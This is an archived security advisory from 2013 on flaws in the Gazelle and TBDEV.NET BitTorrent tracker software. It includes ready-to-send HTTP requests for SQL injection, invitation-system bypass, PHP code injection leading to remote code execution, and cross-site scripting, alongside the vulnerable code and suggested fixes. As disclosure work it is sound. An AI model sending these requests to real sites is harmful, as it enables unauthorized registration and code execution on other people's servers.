@@ -1,0 +1,236 @@
+id: 21388
+date: 10/16/2013
+title: Gazelle SQL Injection / TBDEV.NET Code Execution Vulnerability
+author: Bogdan Calin
+cves: 
+
+Gazelle and TBDEV.NET are the most popular web applications used as BitTorrent trackers. A
+BitTorrent tracker is an application that assists in the communication between peers using the
+BitTorrent protocol.
+
+BitTorrent trackers can be public/open where anybody can join or private (where an invitation is
+required to join the site). Most private torrent trackers are based either on Gazelle or not TBDEV.NET.
+
+All vulnerabilities reported here were automatically discovered by Acunetix WVS version 9.0 (except
+the second one from Gazelle which requires manual code review).
+
+I. Gazelle
+===========
+I've downloaded the Gazelle source code from http://whatcd.github.io/Gazelle/.
+
+List of vulnerabilities:
+
+a) SQL injection in /staffpm.php, POST parameter "level"
+--------------------------------------------------------
+This vulnerability requires that you have a valid user account and you can send private messages to
+the staff (default settings).
+
+Here is sample HTTP request:
+
+POST /staffpm.php HTTP/1.1
+Content-Length: 45
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Cookie: session=[...]
+Host: hostname
+Accept: */*
+
+action=takepost&level=@vulnerable&message=20&subject=1
+
+The application is making the following SQL query while processing the previous HTTP request.
+
+INSERT INTO staff_pm_conversations
+(Subject, Status, Level, UserID, Date)
+VALUES
+('1', 'Unanswered', @vulnerable, 2, '2013-07-18 14:51:25')
+
+The vulnerable code is in file
+Gazelle-master\sections\staffpm\takepost.php, line 6.
+
+The source code is:
+if ($Message = db_string($_POST['message'])) {
+  if ($Subject = db_string($_POST['subject'])) {
+    // New staff PM conversation
+    $Level = db_string($_POST['level']);
+    $DB->query("
+      INSERT INTO staff_pm_conversations
+        (Subject, Status, Level, UserID, Date)
+      VALUES
+        ('$Subject', 'Unanswered', $Level, ".$LoggedUser['ID'].", '".sqltime()."')"
+    );
+
+The $_POST['level'] variable is sanitized using db_string but it's not placed between quotes.
+Therefore is vulnerable to SQL injection.
+
+A simple solution would be to place the $Level variable between quotes:
+('$Subject', 'Unanswered', '$Level', ".$LoggedUser['ID'].", '".sqltime()."')"
+
+b) Invitation system bypass
+--------------------------------------------------------
+If you configure Gazelle not to accept open registrations and to require an invitation code (as all
+private trackers do) it's possible to bypass this protection and register without a valid invitation
+code.
+
+The vulnerable code is in file
+\Gazelle-master\sections\register\index.php
+
+Portions of the code:
+
+...
+} elseif (OPEN_REGISTRATION || !empty($_REQUEST['invite'])) {
+...
+
+      if ($_POST['invite']) {
+        $DB->query("
+          SELECT InviterID, Email
+          FROM invites
+          WHERE InviteKey = '".db_string($_REQUEST['invite'])."'");
+        if (!$DB->has_results()) {
+          $Err = 'Invite does not exist.';
+          $InviterID = 0;
+        } else {
+          list($InviterID, $InviteEmail) = $DB->next_record();
+        }
+      } else {
+        $InviterID = 0;
+      }
+    }
+
+    if (!$Err) {
+            $torrent_pass = Users::make_secret();
+...
+
+In the beginning the code checks for the presence of the $_REQUEST['invite'] variable. It only
+continues if such variable is present.
+
+However, a few lines bellow it's using the $_POST['invite'] and is validating the invitation code
+only if $_POST['invite'] is present.  It's possible to make a request that has the
+$_REQUEST['invite'] variable but doesn't have the $_POST['invite'] variable. The $_REQUEST variable
+is an associative array that by default contains the contents of $_GET, $_POST and $_COOKIE.
+Therefore is possible to make a request with $_GET['invite'] or with $_COOKIE['invite'] and bypass
+the protection.
+
+An example with $_COOKIE['invite']:
+
+POST /register.php HTTP/1.1
+Accept-Encoding: gzip,deflate
+Accept: */*
+Host: hostname
+Cookie: invite=1
+
+username=username&email=sample@gmail.com&password=password&confirm_password=password&readrules=true&readwiki=true&agereq=true&submit=1
+
+This HTTP request is bypassing the protection and the user is registered.
+
+The solution is to either use everywhere $_POST or $_REQUEST.
+
+Both these problems were reported and fixed by Gazelle developers. The latest version is not vulnerable.
+
+II. TBDEV.NET
+===============
+I've downloaded the TBDEV source code from https://sourceforge.net/p/tbdevnet/.
+
+List of vulnerabilities:
+
+a) Improper session termination leading to remote PHP code execution
+
+The scanner found a possible problem with the reputation_settings.php file.
+This page redirects the browser but still returns an HTML body with forms.
+This is usually happening when the session is not properly terminated by terminating the script.
+
+Looking at the code (reputation_settings.php) we see that really there is a problem here:
+
+...  
+  if ( get_user_class() < UC_ADMINISTRATOR )
+    header( "Location: {$TBDEV['baseurl']}/index.php" );
+    
+$rep_set_cache = "cache/rep_settings_cache.php";
+
+  if ( 'POST' == $_SERVER['REQUEST_METHOD'] )
+  {
+  unset($_POST['submit']);
+  //print_r($_POST);
+  rep_cache();
+  exit;
+  }
+
+...
+
+The code checks if the user is an administrator and if that's not the case it redirects the user to
+the index page. This works if you are using a browser to visit the page. However, the scripts
+doesn't terminate and still executes the remaining lines of code. The following lines of code write
+some of the user input to a .PHP file leading to remote code execution.
+
+To exploit this vulnerability you make a request like:
+
+POST /reputation_settings.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=3vkijo13v6skf24espfl72v8r5; tbalpha_uid=2; tbalpha_pass={hash}
+Host: hostname
+Content-Length: 246
+
+'%2bphpinfo()%2b'a=1,rep_adminpower=5&rep_default=10&rep_is_online=0&rep_kppower=100&rep_maxperday=10&rep_minpost=50&rep_minrep=10&rep_pcpower=1000&rep_rdpower=365&rep_repeat=20&rep_undefined=is%20off%20the%20scale&rep_userrates=5&submit=Submit
+
+This HTTP request will return with a message "Reputation Settings Have Been Updated!" and update the
+reputation settings file.
+
+Therefore, the file cache/rep_settings_cache.php will now contain our PHP code.
+...
+<?php
+
+$GVARS = array(
+  ''+phpinfo()+'a' => 1,
+  'rep_default' => 10,
+
+...
+
+This file is included in reputation.php so visiting the URL http://hostname/reputation.php will show
+the phpinfo page.
+
+To learn more about this type of vulnerabilities read this page
+http://www.acunetix.com/blog/web-security-zone/html-form-found-in-redirect-page/
+
+To fix this problem you must terminate the script instead of just redirecting the user.
+
+b) Server Side Request Forgery (/takeprofedit.php)
+Server Side Request Forgery is a vulnerability that allows an attacker to force server interfaces
+into sending packets initiated by the victim server to another servers.
+The scanner set the URL encoded POST input avatar to a remote URL (http://hitxfHcA6ztoB.bxss.me/)
+and a HTTP request was initiated to this domain which indicates that this script is vulnerable to
+SSRF (Server Side Request Forgery).
+
+c) Email Injection (/email-gateway.php)
+Email injection is a security vulnerability that allows malicious users to send email messages using
+someone else's server without prior authorization.
+By manipulating the POST input subject is possible to inject various mail headers like bcc:
+emailaddress and so on.
+
+d) Host header attack (/bitbucket-upload.php)
+An attacker can manipulate the Host header as seen by the web application and cause the application
+to behave in unexpected ways. Developers often resort to the exceedingly untrustworthy HTTP Host
+header (_SERVER["HTTP_HOST"] in PHP).
+Host header evilhostdmBBPBJQ.com was reflected inside a FORM tag (action attribute).
+
+e) Various Cross Site Scripting vulnerabilities:
+
+Filename: /forums.php
+URL encoded GET input keywords was set to 1' onmouseover=prompt(960142) bad='
+The input is reflected inside a tag parameter between single quotes.
+
+Filename: /login.php
+URL encoded GET input returnto was set to 1' onmouseover=prompt(978763) bad='
+The input is reflected inside a tag parameter between single quotes.
+
+Filename: /redir.php
+URL encoded GET input url was set to javascript:prompt(988296);
+The input is reflected inside a META refresh parameter.
+
+I've tried to report these problems on many ocassions/places but didn't received any response.
+
+On 7/18/2013 I've posted the following bug report to the tbdevnet project but didn't received any
+response. https://sourceforge.net/p/tbdevnet/bugs/5/
+
+This article was originally posted on
+http://www.acunetix.com/blog/news/critical-vulnerabilities-discovered-gazelle-tbdev-net/
+
+#  0day.today [2023-03-26]  #
